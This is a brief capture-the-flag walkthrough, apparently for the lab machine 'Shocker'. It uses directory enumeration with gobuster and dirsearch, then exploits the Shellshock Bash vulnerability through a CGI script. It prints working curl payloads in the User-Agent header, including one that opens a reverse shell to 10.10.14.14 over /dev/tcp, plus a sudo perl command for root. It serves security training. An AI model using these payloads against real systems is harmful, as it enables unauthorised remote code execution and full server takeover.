Since it name Shocker, so it means [**Shellshock Vulnerability**](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)

```Bash
since it is apache, so we use gobuster check /cgi-bin/   -x py, sh,pl only 
```

```Bash
curl -A "() { :;};echo; /bin/ls" http://10.10.10.56/cgi-bin/user.sh
```

```Bash
curl -A "() { :;};echo; /bin/bash -i >& /dev/tcp/10.10.14.14/1234 0>&1" http://10.10.10.56/cgi-bin/user.sh
```

```Bash
sudo -l  //we find perl
sudo /usr/bin/perl -e 'exec("/bin/sh -i")' // get root
```

use gobuster to find directory, need use —add-slash

```PowerShell
 sudo gobuster dir -w /Users/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.10.10.56  -no -error --add-slash
```

after find /cgi-bin

```PowerShell
 sudo gobuster dir -w /Users/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.10.10.56/cgi-bin  -no -error  -x php,txt,sh,pl
```

```PowerShell
dirsearch -u http://10.10.10.56/cgi-bin -e cgi,pl,sh
dirsearch -u http://10.10.10.56/
```